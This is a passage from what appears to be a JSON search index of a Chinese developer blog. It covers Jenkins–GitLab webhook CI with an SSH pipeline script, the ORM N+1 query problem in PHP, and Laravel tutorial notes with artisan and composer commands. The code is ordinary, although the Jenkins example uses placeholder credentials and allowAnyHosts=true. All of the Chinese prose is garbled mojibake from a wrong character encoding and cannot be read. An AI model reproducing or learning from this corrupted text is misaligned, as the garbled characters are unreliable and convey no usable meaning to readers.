æŒç»­é›†æˆ","slug":"jenkins-gitlab-continuous-integration","date":"2021-03-16T14:27:42.000Z","updated":"2021-03-17T14:56:26.907Z","comments":true,"path":"jenkins-gitlab-continuous-integration/","link":"","permalink":"https://www.0x2beace.com/jenkins-gitlab-continuous-integration/","excerpt":"Jenkins æ˜¯ä»€ä¹ˆï¼Ÿ Jenkinsæ˜¯ä¸€ä¸ªå¼€æºçš„ã€æä¾›å‹å¥½æ“ä½œç•Œé¢çš„æŒç»­é›†æˆ(CI)å·¥å…·ã€‚","text":"Jenkins æ˜¯ä»€ä¹ˆï¼Ÿ Jenkinsæ˜¯ä¸€ä¸ªå¼€æºçš„ã€æä¾›å‹å¥½æ“ä½œç•Œé¢çš„æŒç»­é›†æˆ(CI)å·¥å…·ã€‚ Jenkins å¦‚ä½•ä¸Gitlab è¿›è¡Œå…³è”ï¼Ÿ å¯ä»¥é€šè¿‡ç”Ÿæˆå¯†é’¥ï¼ˆWebhooks çš„é’©å­ï¼‰ï¼Œç„¶ååˆ°Gitlab éœ€è¦é›†æˆçš„é¡¹ç›®ä¸­ï¼Œè®¾ç½®é›†æˆåŠŸèƒ½ï¼Œå¢åŠ Web é’©å­ã€‚ è¿™æ ·å½“è¿›è¡ŒPush åŠ¨ä½œæ—¶ï¼Œå°±ä¼šè§¦å‘Jenkins è¿›è¡Œæ„å»ºï¼Œç„¶åæ‰§è¡Œç›¸åº”çš„æµæ°´çº¿ã€‚ å¯¹äºå°å…¬å¸è€Œè¨€ï¼Œå¼€å‘æœåŠ¡å™¨å¸¸ç”¨çš„æ¶æ„æ˜¯å†…ç½‘æœåŠ¡å™¨ï¼ˆæœ¬åœ°æœºå™¨ï¼‰+å¤–ç½‘æœåŠ¡å™¨å†…ç½‘ç©¿é€ï¼ŒJenkins + ç§æœ‰Gitlab æŒç»­é›†æˆã€‚ èƒŒæ™¯ï¼šJenkins å’ŒGitlab éƒ¨ç½²åœ¨å¤–ç½‘æœåŠ¡å™¨ä¸Šï¼Œé€šè¿‡å†…ç½‘ç©¿é€å¯¹å†…ç½‘æœåŠ¡å™¨ï¼ˆå¼€å‘æœåŠ¡å™¨ï¼‰è¿›è¡Œè®¿é—®ã€‚éœ€æ±‚æè¿°ï¼šæ¯æ¬¡è¿›è¡ŒPush æ—¶ï¼Œè§¦å‘Jenkins æµæ°´çº¿ï¼Œè¿›è¡Œæ„å»ºï¼Œå°†æœ€æ–°çš„ç‰ˆæœ¬åŒæ­¥åˆ°å¼€å‘æœåŠ¡å™¨ä¸Šã€‚ Jenkinsçš„åŠŸèƒ½å¾ˆå¼ºå¤§ï¼Œè¿™é‡Œå¹¶ä¸æ‰“ç®—æ·±å…¥æ‹“å±•ï¼Œè€Œæ˜¯ä»‹ç»ä¸€ç§ç›¸è¾ƒç®€å•ç²—æš´çš„æ–¹å¼å»å®ŒæˆæŒç»­é›†æˆã€‚ åˆ›å»ºä»»åŠ¡é¦–å…ˆéœ€è¦åœ¨Jenkins ä¸Šæ–°å»ºä»»åŠ¡ï¼Œå› ä¸ºéœ€æ±‚å¹¶ä¸å¤æ‚ï¼Œè¿™é‡Œç›´æ¥é€‰æ‹©æµæ°´çº¿çš„æ–¹å¼ å¦‚æœéœ€è¦å…³è”TAPDï¼Œè¿™é‡Œéœ€è¦ã€Œå…³è”TAPDã€å¡«ä¸Šå¯¹åº”TAPD çš„IDã€‚ æ ¸å¿ƒçš„é…ç½®åœ¨æ„å»ºè§¦å‘å™¨è¿™ä¸€å—ï¼Œæ ¹æ®Push äº‹ä»¶ï¼Œè§¦å‘æ‰§è¡Œæµæ°´çº¿ã€‚ æœ‰ä»¥ä¸‹å‡ ä¸ªç‚¹éœ€è¦æ³¨æ„ï¼š å› ä¸ºæ˜¯å¼€å‘æœåŠ¡å™¨ï¼Œå¹¶æ²¡æœ‰å¼€å¯åˆå¹¶è¯·æ±‚ã€‚ Gitlab webhook URL éœ€è¦è®°ä½ï¼Œåé¢ä¼šç”¨åˆ°ã€‚ é»˜è®¤å…è®¸æ‰€æœ‰åˆ†æ”¯ï¼Œå¦‚æœæœ‰ç‰¹æ®Šéœ€æ±‚ï¼Œå¯ä»¥æŒ‡å®šåˆ†æ”¯åè¿›è¡Œè¿‡æ»¤ã€‚ ç‚¹å‡»å³ä¸‹è§’çš„Generate æŒ‰é’®ç”ŸæˆSecret tokenï¼Œåé¢ä¼šç”¨åˆ°ã€‚ é…ç½®æµæ°´çº¿ï¼š ä¸ŠåŠéƒ¨åˆ†æ˜¯è¿æ¥å†…ç½‘æœåŠ¡å™¨ï¼ˆå¼€å‘æœåŠ¡å™¨ï¼‰çš„åŸºç¡€ä¿¡æ¯ï¼Œä¸‹åŠçš„é…ç½®ä¿¡æ¯æ˜¯éœ€è¦æ‰§è¡Œçš„æ„å»ºè„šæœ¬ã€‚ æ„å»ºè„šæœ¬çš„ä½œç”¨å…¶å®å°±æ˜¯å»æ‰§è¡Œgit pull è¿™ä¸ªåŠ¨ä½œï¼Œå¤§æ¦‚é•¿è¿™æ ·ï¼š 1234567#!&#x2F;usr&#x2F;bin&#x2F;bashpull() &#123; cd &#x2F;var&#x2F;www&#x2F;project &amp;&amp; git pull&#125;pull æµæ°´çº¿é…ç½®ï¼Œç‚¹å‡»æŸ¥çœ‹è¯¦æƒ…ä¿¡æ¯ def bdService() { def remote = [:] remote.name = 'hostname' remote.host = 'localhost' remote.port = 22 remote.user = 'username' remote.password = 'password' remote.allowAnyHosts = true return remote } pipeline { agent any stages { stage('ä»£ç é›†æˆ') { steps { script { def remote = bdService(); sshCommand remote: remote, command: \"/bin/bash /opt/shell/build.sh\" } } } } } é…ç½®å®Œæˆä¹‹åï¼Œç‚¹å‡»ä¿å­˜ã€‚ è¿”å›å·¥ä½œæ€ï¼Œæ‰¾åˆ°å¯¹åº”ä»»åŠ¡ï¼Œç‚¹å‡»ç«‹å³æ„å»ºã€‚ é€šè¿‡æ„å»ºå†å²ï¼ŒæŸ¥çœ‹Console Outputï¼Œèƒ½çœ‹åˆ°ç±»ä¼¼è¾“å‡ºåˆ™è¡¨ç¤ºæ„å»ºæˆåŠŸã€‚ æ„å»ºæˆåŠŸä¹‹åï¼Œå°±å¯ä»¥ä¸Gitlab è¿›è¡Œå…³è”äº†ï¼Œç‚¹å‡»é¡¹ç›®=&gt;è®¾ç½®=&gt;é›†æˆã€‚ é“¾æ¥ï¼ˆURLï¼‰æ˜¯ä¹‹å‰çš„ Webhook urlï¼Œå®‰å…¨ä»¤ç‰Œåˆ™æ˜¯ä¸Šé¢ç”Ÿæˆçš„ Secret tokenï¼ŒSSL è¯ä¹¦éªŒè¯è§†æƒ…å†µé€‰æ‹©æ˜¯å¦å¼€å¯ï¼Œç„¶åç‚¹å‡»å¢åŠ Web é’©å­ã€‚ è‡³æ­¤æ‰€æœ‰çš„é…ç½®å°±åŸºæœ¬å®Œæˆäº†ï¼Œè¿™æ—¶å¯ä»¥å»æµ‹è¯•Pushï¼Œçœ‹çœ‹æ˜¯å¦ä¼šæ‰§è¡Œè‡ªåŠ¨æ„å»ºã€‚","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://www.0x2beace.com/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Jenkins","slug":"è¿ç»´/Jenkins","permalink":"https://www.0x2beace.com/categories/%E8%BF%90%E7%BB%B4/Jenkins/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"},{"name":"CI","slug":"CI","permalink":"https://www.0x2beace.com/tags/CI/"},{"name":"Jenkins","slug":"Jenkins","permalink":"https://www.0x2beace.com/tags/Jenkins/"},{"name":"CD","slug":"CD","permalink":"https://www.0x2beace.com/tags/CD/"}]},{"title":"ä»€ä¹ˆæ˜¯ N+1 é—®é¢˜ï¼Œä»¥åŠå¦‚ä½•è§£å†³","slug":"what-is-the-n-1-problem-and-how-to-solve-it","date":"2021-03-15T14:10:11.000Z","updated":"2021-03-17T04:42:49.315Z","comments":true,"path":"what-is-the-n-1-problem-and-how-to-solve-it/","link":"","permalink":"https://www.0x2beace.com/what-is-the-n-1-problem-and-how-to-solve-it/","excerpt":"N+1 æ˜¯ORMï¼ˆå¯¹è±¡å…³ç³»æ˜ å°„ï¼‰å…³è”æ•°æ®è¯»å–ä¸­å­˜åœ¨çš„ä¸€ä¸ªé—®é¢˜ã€‚","text":"N+1 æ˜¯ORMï¼ˆå¯¹è±¡å…³ç³»æ˜ å°„ï¼‰å…³è”æ•°æ®è¯»å–ä¸­å­˜åœ¨çš„ä¸€ä¸ªé—®é¢˜ã€‚ åœ¨ä»‹ç»ä»€ä¹ˆæ˜¯N+1é—®é¢˜ä¹‹å‰ï¼Œé¦–å…ˆæ€è€ƒä¸€ä¸ªé—®é¢˜ï¼š å‡è®¾ç°åœ¨æœ‰ä¸€ä¸ªç”¨æˆ·è¡¨ï¼ˆUserï¼‰å’Œä¸€ä¸ªä½™é¢è¡¨ï¼ˆBalanceï¼‰ï¼Œè¿™ä¸¤ä¸ªè¡¨é€šè¿‡user_idè¿›è¡Œå…³è”ã€‚ç°åœ¨æœ‰ä¸€ä¸ªéœ€æ±‚æ˜¯æŸ¥è¯¢å¹´é¾„å¤§äº18å²çš„ç”¨æˆ·ï¼Œä»¥åŠç”¨æˆ·å„è‡ªçš„ä½™é¢ã€‚ è¿™ä¸ªé—®é¢˜å¹¶ä¸éš¾ï¼Œä½†å¯¹äºæ–°æ‰‹è€Œè¨€ï¼Œå¯èƒ½å¸¸å¸¸ä¼šçŠ¯çš„ä¸€ä¸ªé”™è¯¯å°±æ˜¯åœ¨å¾ªç¯ä¸­è¿›è¡ŒæŸ¥è¯¢ã€‚ 12345$users &#x3D; User::where(&quot;age&quot;, &quot;&gt;&quot;, 18)-&gt;select();foreach($users as $user)&#123; $balance &#x3D; User::getFieldByUserId($user-&gt;user_id, &quot;balance&quot;); $user[&#39;balance&#39;] &#x3D; $balance;&#125; è¿™æ ·åšæ˜¯éå¸¸ç³Ÿç³•çš„ï¼Œæ•°æ®é‡å°è¿˜å°‘ï¼Œåœ¨æ•°æ®é‡è¾ƒå¤§çš„æƒ…å†µä¸‹ï¼Œæ˜¯éå¸¸æ¶ˆè€—æ•°æ®åº“æ€§èƒ½çš„ã€‚ é€šè¿‡Mysql æŸ¥è¯¢æ—¥å¿—ï¼Œå¯ä»¥çœ‹åˆ°æŸ¥è¯¢ç”¨æˆ·è¡¨æ˜¯ä¸€æ¬¡ï¼Œå› ä¸ºæœ‰å››ä¸ªç¬¦åˆè¯¥æ¡ä»¶çš„ç”¨æˆ·ï¼ŒæŸ¥è¯¢ç”¨æˆ·è¡¨å…³è”çš„ä½™é¢è¡¨æ˜¯å››æ¬¡ã€‚ N+1é—®é¢˜å°±æ˜¯è¿™æ ·äº§ç”Ÿçš„ï¼šæŸ¥è¯¢ä¸»è¡¨æ˜¯ä¸€æ¬¡ï¼ŒæŸ¥è¯¢å‡ºN æ¡è®°å½•ï¼Œæ ¹æ®è¿™N æ¡è®°å½•ï¼ŒæŸ¥è¯¢å…³è”çš„å‰¯ï¼ˆä»ï¼‰è¡¨ï¼Œå…±éœ€è¦N æ¬¡ã€‚æ‰€ä»¥ï¼Œåº”è¯¥å«1+N é—®é¢˜æ›´åˆé€‚ä¸€äº›ã€‚ å…¶å®ï¼Œå¦‚æœç¨å¾®äº†è§£ä¸€ç‚¹SQLï¼Œæ ¹æœ¬ä¸ç”¨è¿™ä¹ˆéº»çƒ¦ï¼Œç›´æ¥ä½¿ç”¨JOIN ä¸€æ¬¡å°±æå®šäº†ã€‚ å¯¹äºè¿™ç±»é—®é¢˜ï¼ŒORM å…¶å®ä¸ºæˆ‘ä»¬æä¾›äº†ç›¸åº”çš„æ–¹æ¡ˆï¼Œé‚£å°±æ˜¯ä½¿ç”¨ã€é¢„åŠ è½½åŠŸèƒ½ã€ã€‚ é¢„åŠ è½½åŠŸèƒ½ä½¿ç”¨with()æ–¹æ³•æŒ‡å®šæƒ³è¦é¢„åŠ è½½çš„å…³è”ï¼š 123$users &#x3D; User::where(&quot;age&quot;, &quot;&gt;&quot;, 18) -&gt;with(&quot;hasBalance&quot;) -&gt;select(); hasBalance æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ å®ƒæ˜¯åœ¨Useræ¨¡å‹ä¸­å®šä¹‰çš„ä¸€ä¸ªæ–¹æ³•ï¼š 12345678910class User extends Model&#123; &#x2F;&#x2F; ... &#x2F;&#x2F; Useræ¨¡å‹ä¸Balance æ¨¡å‹è¿›è¡Œä¸€å¯¹ä¸€å…³è” public function hasBalance() &#123; return $this-&gt;hasOne(Balance::class, &quot;user_id&quot;, &quot;user_id&quot;); &#125;&#125; é€šè¿‡è¿™ä¸ªæ–¹æ³•è®©User æ¨¡å‹ä¸Balance æ¨¡å‹è¿›è¡Œä¸€å¯¹ä¸€å…³è”ã€‚ ç°åœ¨å†æ¥çœ‹ä¸€ä¸‹Mysql çš„æŸ¥è¯¢æ—¥å¿—ï¼š å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°ï¼Œæ€»æŸ¥è¯¢æ¬¡æ•°ç”±åŸæ¥çš„1+N å˜æˆäº†ç°åœ¨çš„1+1ã€‚ æ€»ç»“N+1 é—®é¢˜æ˜¯ä»€ä¹ˆï¼Ÿä¼šé€ æˆä»€ä¹ˆå½±å“ï¼Ÿåº”è¯¥å¦‚ä½•è§£å†³ï¼Ÿ æ‰§è¡Œä¸€æ¬¡æŸ¥è¯¢è·å–N æ¡ä¸»æ•°æ®åï¼Œç”±äºå…³è”å¼•èµ·çš„æ‰§è¡ŒN æ¬¡æŸ¥è¯¢ä»æ•°æ® å¸¦æ¥äº†ä¸å¿…è¦çš„æŸ¥è¯¢å¼€é”€ å¯ä»¥é€šè¿‡æ¡†æ¶ ORM è‡ªå¸¦çš„with å»è§£å†³","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"},{"name":"ThinkPHP","slug":"ThinkPHP","permalink":"https://www.0x2beace.com/tags/ThinkPHP/"}]},{"title":"L01 Laravel æ•™ç¨‹- Web å¼€å‘å®æˆ˜å…¥é—¨è¯¾ç¨‹ç¬”è®°","slug":"laravel-tutorial-notes-for-a-hands-on-introduction-to-web-development","date":"2021-03-14T04:10:01.000Z","updated":"2021-03-15T14:18:15.623Z","comments":true,"path":"laravel-tutorial-notes-for-a-hands-on-introduction-to-web-development/","link":"","permalink":"https://www.0x2beace.com/laravel-tutorial-notes-for-a-hands-on-introduction-to-web-development/","excerpt":"L01 Laravel æ•™ç¨‹- Web å¼€å‘å®æˆ˜å…¥é—¨è¯¾ç¨‹ç¬”è®°ã€‚","text":"L01 Laravel æ•™ç¨‹- Web å¼€å‘å®æˆ˜å…¥é—¨è¯¾ç¨‹ç¬”è®°ã€‚ ç¬¬ä¸€ç« æ„å»ºåº”ç”¨ï¼ˆ8.*ï¼‰ï¼š 1$ composer create-project laravel&#x2F;laravel weibo --prefer-dist &quot;8.*&quot; æ„å»ºåº”ç”¨ï¼ˆ5.*ï¼‰ï¼š 1$ composer create-project laravel&#x2F;laravel Laravel --prefer-dist &quot;5.7.*&quot; Ubuntu ä¸­æŸ¥çœ‹æ‰€æœ‰PHP ç‰ˆæœ¬ï¼š 1$ update-alternatives --display php Ubuntu ä¸­å¿«é€Ÿåˆ‡æ¢PHP ç‰ˆæœ¬ï¼š 1$ sudo update-alternatives --config php å·¥ä½œåŸç†ï¼š æ³¨æ„äº‹é¡¹ï¼š è·¯ç”±çš„æœåŠ¡æä¾›è€…ç±»ä¸­è®¾ç½®å‘½åç©ºé—´ blade.php æ˜¯Laravel çš„ä¸€å¥—æ¨¡ç‰ˆå¼•æ“ï¼Œæœ‰è‡ªå·±çš„ä¸€å¥—è§„åˆ™ï¼Œé€šè¿‡ç»§æ‰¿çˆ¶è§†å›¾ï¼Œå¯ä»¥å‡å°‘å¾ˆå¤šé‡å¤ä»£ç  art tinker æ˜¯ Laravel æ¡†æ¶è‡ªå¸¦çš„å‘½ä»¤ï¼Œç”¨ä»¥è°ƒå‡º Laravel çš„äº¤äº’å¼è¿è¡Œæ—¶ artisan å‘½ä»¤Artisan æ˜¯ Laravel æä¾›çš„ CLIï¼ˆå‘½ä»¤è¡Œæ¥å£ï¼‰ã€‚ å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š|å‘½ä»¤|è¯´æ˜||-|-||php artisan key:generate|ç”ŸæˆApp Key||php artisan make:controller|ç”Ÿæˆæ§åˆ¶å™¨||php artisan make:model|ç”Ÿæˆæ¨¡å‹||php artisan make:policy|ç”Ÿæˆæˆæƒç­–ç•¥||php artisan make:seeder|ç”ŸæˆSeeder æ–‡ä»¶||php artisan migrate|æ‰§è¡Œè¿ç§»||php artisan migrate:rollback|å›æ»šè¿ç§»||php artisan migrate:refresh|é‡ç½®æ•°æ®åº“||php artisan db:seed|å¡«å……æ•°æ®åº“||php artisan migrate:refresh â€“seed|è¿›è¡Œæ•°æ®åº“è¿ç§»åŒæ—¶å¡«å……æ•°æ®åº“||php artisan tinker|è¿›å…¥tinker ç¯å¢ƒ||php artisan route:list|æŸ¥çœ‹è·¯ç”±åˆ—è¡¨| ç¬¬ä¸€ç« å­¦åˆ°äº†ä»€ä¹ˆ å¦‚ä½•æ„å»ºä¸€ä¸ªLaravel åº”ç”¨ å¯¹æ–°å»ºçš„Laravel é¡¹ç›®è¿›è¡ŒåŸºæœ¬é…ç½® æ‰‹åŠ¨åˆ›å»ºæ§åˆ¶å™¨ã€é™æ€è§†å›¾ äº†è§£è·¯ç”±ã€æ§åˆ¶å™¨ã€è§†å›¾çš„åŸºæœ¬åä½œæ–¹å¼ äº†è§£å¦‚ä½•ä½¿ç”¨é€šç”¨è§†å›¾ äº†è§£Artisan å‘½ä»¤çš„åŸºæœ¬ä½¿ç”¨ ç¬¬äºŒç« 1$ composer require laravel&#x2F;ui:^3.0 --dev composer require å‘½ä»¤æ˜¯ç”¨æ¥å®‰è£…æ‰©å±•åŒ…çš„å‘½ä»¤ï¼Œå‚æ•°--devè¡¨ç¤ºä»…ä»…åªåœ¨å¼€å‘ç¯å¢ƒä¸­ä½¿ç”¨ã€‚ ä¸Šé¢å‘½ä»¤å®‰è£…å®Œæˆä¹‹åï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å¼•å…¥ bootstrapï¼š 1$ php artisan ui bootstrap å»ºè®®ä½¿ç”¨yarnå‘½ä»¤ä»£æ›¿npm å‘½ä»¤ï¼š 1$ yarn install å‰ç«¯ä»£ç ç¼–è¯‘å‡ºç°é—®é¢˜æ—¶ï¼Œå¯ä»¥å°è¯•å°†node_moudlesæ–‡ä»¶å¤¹åˆ é™¤ï¼Œå†æ¬¡å®‰è£…ç›¸å…³ä¾èµ–ã€‚ 1$ npm run watch-poll ä¸Šé¢è¿™æ¡å‘½ä»¤çš„ä½œç”¨å…¶å®å°±æ˜¯ç›‘è§†å‰ç«¯æ–‡ä»¶å˜åŒ–ï¼Œå¦‚æœæœ‰å˜åŒ–çš„è¯ï¼Œå°±é©¬ä¸Šç¼–è¯‘ã€‚ ç”Ÿæˆç¯å¢ƒä¸­ï¼Œä¸ºä»€ä¹ˆä¸ç”¨ä¸€ç›´å¼€å¯è¿™ä¸ªå‘½ä»¤ï¼Ÿ è¿™æ˜¯å› ä¸ºæœåŠ¡ç«¯åªéœ€è¦æ‰‹åŠ¨ç¼–è¯‘ä¸€æ¬¡å°±å¥½ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨npm run devå‘½ä»¤ã€‚ ä¹‹æ‰€ä»¥è¯´Laravel æ˜¯å…¨æ ˆæ¡†æ¶ï¼Œå°±æ˜¯å› ä¸ºå®ƒåœ¨ä¸€ä¸ªé¡¹ç›®ä¸­æŠŠå‰ç«¯å’Œåç«¯æ‰€æœ‰ä¸œè¥¿éƒ½åŒ…æ½äº†ã€‚ Laravel çš„å‰ç«¯å·¥ä½œæµLaravel çš„å‰ç«¯å·¥ä½œæµæ˜¯é€šè¿‡ Sassã€NPMã€Yarnã€Laravel Mix æ„æˆä¸€å¥—å‰ç«¯å·¥ä½œæµã€‚ Sass æ˜¯ä¸€ç§å¯ç”¨äºç¼–å†™CSS çš„è¯­è¨€ã€‚ Yarn æ˜¯ä¸€ä¸ªç”¨äºä»£æ›¿NPM å®¢æˆ·ç«¯çš„æ–°çš„åŒ…ç®¡ç†å™¨ã€‚ Laravel Mix æ˜¯ä¸€ä¸ªå‰ç«¯ä»»åŠ¡è‡ªåŠ¨åŒ–ç®¡ç†å·¥å…·ã€‚Laravel Mix å¯ä»¥è‡ªåŠ¨ç¼–è¯‘resourcesä¸‹é¢çš„æ–‡ä»¶ã€‚ åŒæ‹¬å· æ˜¯åœ¨Html ä¸­å†…åµŒPHP çš„Blade è¯­æ³•ï¼Œè¡¨ç¤ºåŒ…å«åœ¨è¯¥åŒºåŸŸå†…çš„ä»£ç ä½¿ç”¨PHP æ¥ç¼–è¯‘æ‰§è¡Œã€‚ ç¬¬äºŒç« å­¦åˆ°äº†ä»€ä¹ˆ Laravel çš„å‰ç«¯å·¥ä½œæµ å±€éƒ¨è§†å›¾çš„è®¢å•å’Œå¼•ç”¨ å‘½åè·¯ç”±çš„å®šä¹‰å’Œä½¿ç”¨ ç¬¬ä¸‰ç« Eloquent ORMå…¶ç‰¹ç‚¹æ˜¯ä¸€ä¸ªæ¨¡å‹å¯¹åº”æ•°æ®åº“ä¸­çš„ä¸€ä¸ªè¡¨ã€‚ åœ¨è¿›è¡Œæ•°æ®åº“è¿ç§»æ—¶ï¼Œup æ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œåœ¨è¿›è¡Œæ•°æ®åº“å›æ»šæ—¶ï¼Œdownæ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ æ‰€ä»¥æ— è®ºæ˜¯åˆæ¬¡åˆ›å»ºè¡¨ï¼Œè¿˜æ˜¯åé¢å¢åŠ å­—æ®µï¼Œéƒ½éœ€è¦å»up æ–¹æ³•ä¸‹è¿›è¡Œå®šä¹‰ï¼Œè¿™æ ·åœ¨æ•°æ®åº“è¿ç§»æ—¶æ‰ä¼šç”Ÿæ•ˆã€‚ åˆ›å»ºä¸€å¼ è¡¨ï¼š 1$ php artisan make:migration create_followers_table --create&#x3D;&quot;followers&quot; å¢åŠ ä¸€ä¸ªå­—æ®µï¼š 1$ php artisan make:migration add_activation_to_users_table --table&#x3D;users æ•°æ®åº“çš„å›æ»šä¸è¿ç§»ç›´æ¥å¯¹åº”ç€ databases æ–‡ä»¶å¤¹ä¸‹çš„è¿ç§»æ–‡ä»¶ã€‚ åˆ›å»ºæ¨¡å‹çš„åŒæ—¶å¹¶è¿›è¡Œè¿ç§»ï¼š 1$ php artisan make:model Model&#x2F;Articles -m å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œæ•°æ®åº“äº¤äº’ï¼š 1$ php artisan tinker è¯¥å‘½ä»¤å¯ä»¥è¿›å…¥Eloquent æ¨¡å‹ï¼Œç›´æ¥è¿›è¡Œæ•°æ®åº“äº¤äº’ã€‚åœ¨è¯¥æ¨¡å¼ä¸‹ï¼ŒEloquent æ¨¡å‹çš„æ–¹æ³•å‡å¯ä»¥ä½¿ç”¨ã€‚ ç¬¬ä¸‰ç« å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ Eloquent æ¨¡å‹çš„å®šä¹‰ä¸åº”ç”¨ æ•°æ®åº“è¿ç§»ä¸å›æ»šï¼ˆæ•°æ®è¡¨ç”Ÿæˆä¸åˆ é™¤ï¼‰ æ¨¡å‹çš„åˆ›å»ºä¸ä½¿ç”¨ tinker çš„ä½¿ç”¨ ç¬¬å››ç« åœ¨æœ¬åœ°å¯ä»¥è¿™æ ·è®¿é—®Homestead çš„æ•°æ®åº“ï¼š 1$ mysql -uhomestead -h127.0.0.1 -P33060 -p &#x2F;&#x2F; æˆ–è€… mysql -uhomestead -h192.168.10.10 -P3306 -p ä½†æ˜¯åœ¨é¡¹ç›®ï¼ˆHomesteadï¼‰ä¸­ï¼Œåªèƒ½è¿™æ ·è®¿é—®ï¼š 1$ mysql -uhomestead -h127.0.0.1 -P3360 -p &#x2F;&#x2F; æˆ–è€… mysql -uhomestead -h192.168.10.10 -P3306 -p å› ä¸ºç«¯å£åšäº†æ˜ å°„ï¼ˆHomestead 3306=&gt; ä¸»æœº 33060ï¼‰ï¼Œè€Œé¡¹ç›®åˆè¿è¡Œåœ¨Homestead ä¸­ï¼Œæ‰€ä»¥é¡¹ç›®é…ç½®ä¸­çš„ç«¯å£ä¸èƒ½å†™æˆ33060ï¼Œå¦åˆ™æ— æ³•æ­£å¸¸è®¿é—®ã€‚ éšå½¢è·¯ç”±ç»‘å®šè¿™ä¸ªã€éšå½¢è·¯ç”±ç»‘å®šã€å€’åº•æ˜¯ä¸ªå•¥ç©æ„ï¼Ÿç®€å•ç†è§£å°±æ˜¯é€šè¿‡æ§åˆ¶å™¨æŠŠæ¨¡å‹ç»‘å®šåœ¨è·¯ç”±ä¸­äº†ã€‚ è·¯ç”±ä»£ç ï¼š 1Route::get(&#39;&#x2F;users&#x2F;&#123;user&#125;&#39;, &#39;UsersController@show&#39;)-&gt;name(&#39;users.show&#39;); æ§åˆ¶å™¨åŠæ¨¡å‹ä»£ç ï¼š 12345use App\\Models\\User;public function show (User $user)&#123; return view(&quot;users.show&quot;, compact(&quot;user&quot;)); &#125; ä¸Šé¢è¿™æ®µä»£ç æœ‰å¾ˆå¤šçŸ¥è¯†ç‚¹ï¼š æ§åˆ¶å™¨æ–¹æ³•show æ˜¯é€šè¿‡è·¯ç”±è·å–çš„ User $user æ˜¯å®šä¹‰åœ¨æ§åˆ¶å™¨ä¸­çš„æ–¹æ³•çš„Eloquent æ¨¡å‹ç±»å‹å£°æ˜ ç”±äºshow æ–¹æ³•ä¼ å‚æ—¶å£°æ˜äº†ç±»å‹â€”â€”Eloquent æ¨¡å‹ï¼Œå¯¹åº”çš„å˜é‡å$user ä¼šåŒ¹é…è·¯ç”±ç‰‡æ®µä¸­çš„{user}ï¼Œè¿™æ ·Laravel ä¼šè‡ªåŠ¨æ³¨å…¥ä¸è¯·æ±‚URL ä¼ å…¥çš„ID å¯¹åº”çš„ç”¨æˆ·æ¨¡å‹å®ä¾‹ã€‚ è¿™é‡Œåˆ©ç”¨äº†éšå½¢è·¯ç”±ç»‘å®šï¼Œç›´æ¥è¯»å–å¯¹åº”ID çš„ç”¨æˆ·çš„å®ä¾‹ã€‚ å…¶å®è¿™ä¸ªå’ŒThinkPHP ä¸­çš„è·¯ç”±ä¼ å‚å¾ˆåƒï¼Œåªä¸è¿‡ä¸åŒçš„æ˜¯ThinkPHP ä¸­æ²¡æœ‰å®šä¹‰æ¨¡å‹ã€‚ 12345Route::get(&#39;hello&#x2F;:name&#39;, &#39;index&#x2F;hello&#39;);public function hello($name)&#123; return $name; &#125; Laravel æ˜¯å¦‚ä½•æ¥æ”¶å‰ç«¯çš„å‚æ•°çš„ï¼Ÿ 123public function sotre(Request $request)&#123; &#x2F;&#x2F; é€šè¿‡ä½¿ç”¨Illuminate\\Http\\Request å®ä¾‹æ¥æ¥æ”¶ç”¨æˆ·è¾“å…¥&#125; ç¬¬å››ç« å­¦åˆ°äº†ä»€ä¹ˆ ä½¿ç”¨RESTFUL æ¥æ„å»ºè·¯ç”±èµ„æº é€šè¿‡è¡¨å•ä¸æ§åˆ¶å™¨ååŒå¤„ç†æ•°æ® éªŒè¯è¡¨å•æäº¤çš„æ•°æ®ï¼Œå¹¶è¿”å›ç›¸åº”çš„å†…å®¹ åˆ©ç”¨Composer å®‰è£…ç›¸åº”æ‰©å±•åŒ… ä½¿ç”¨é—ªå­˜æ¥å±•ç¤ºç”¨æˆ·ä¿¡æ¯ ç¬¬äº”ç« Laravel æä¾›äº†attempt æ–¹æ³•ç”¨äºç™»å½•éªŒè¯ã€‚ 123if (Auth::attempt([&#39;email&#39; &#x3D;&gt; $email, &#39;password&#39; &#x3D;&gt; $password])) &#123; &#x2F;&#x2F; è¯¥ç”¨æˆ·å­˜åœ¨äºæ•°æ®åº“ï¼Œä¸”é‚®ç®±å’Œå¯†ç ç›¸ç¬¦åˆ&#125; attempt æ–¹æ³•æ¥æ”¶ä¸€ä¸ªæ•°ç»„ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¼šå»æ•°æ®åº“ä¸­æ‰¾å¯»å¯¹åº”çš„å€¼ï¼Œé€»è¾‘å¦‚ä¸‹ï¼š æ‰¾å¯»emailå­—æ®µåŒ¹é…çš„å€¼ å¦‚æœæ²¡æ‰¾åˆ°ï¼Œç›´æ¥è¿”å›false å¦‚æœèƒ½æ‰¾åˆ°ï¼ši. å…ˆå°†ä¼ å‚passwordè¿›è¡ŒåŠ å¯†ï¼Œä¸æ•°æ®åº“ä¸­çš„å€¼è¿›è¡Œæ¯”å¯¹ii. å¦‚æœä¸¤ä¸ªå€¼åŒ¹é…ï¼Œä¼šåˆ›å»ºä¸€ä¸ªä¼šè¯ç»™éªŒè¯é€šè¿‡çš„ç”¨æˆ·ï¼Œåœ¨ä¼šè¯åˆ›å»ºçš„åŒæ—¶ï¼Œä¹Ÿä¼šç§ä¸‹ä¸€ä¸ªåä¸º laravel_session çš„ HTTP Cookieï¼Œä»¥æ­¤ Cookie 